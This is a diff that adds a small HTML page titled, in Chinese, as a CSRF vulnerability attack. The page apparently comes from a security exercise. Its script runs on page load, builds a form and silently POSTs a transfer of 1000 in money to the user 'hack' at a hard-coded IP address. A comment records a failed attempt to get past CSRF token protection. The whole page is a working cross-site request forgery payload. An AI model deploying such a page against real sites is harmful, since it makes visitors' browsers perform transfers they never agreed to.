@@ -1,0 +1,35 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+</head>
+<body>
+<h1>csrf漏洞攻击</h1>
+<script>
+        function post(url, fields){
+            var f = document.createElement("form");
+            f.action = url
+            f.innerHTML = fields;
+            f.method = "post";
+            document.body.appendChild(f);
+            f.submit();
+        }
+
+        function csrf(){
+            var fields = "";
+            // 企图多添加一句躲避csrf保护，但是失败了
+            // fields += '<input type="hidden" name="csrf_token" value="{{ csrf_token() }}">';
+            fields += '<input type="text" name="touser" value="hack">';
+            fields += '<input type="text" name="money" value="1000">';
+            var url = "http://121.196.40.74:4500/csrf/";
+
+            post(url, fields);
+        }
+    window.onload = function() { csrf(); }
+
+</script>
+</body>
+</html>
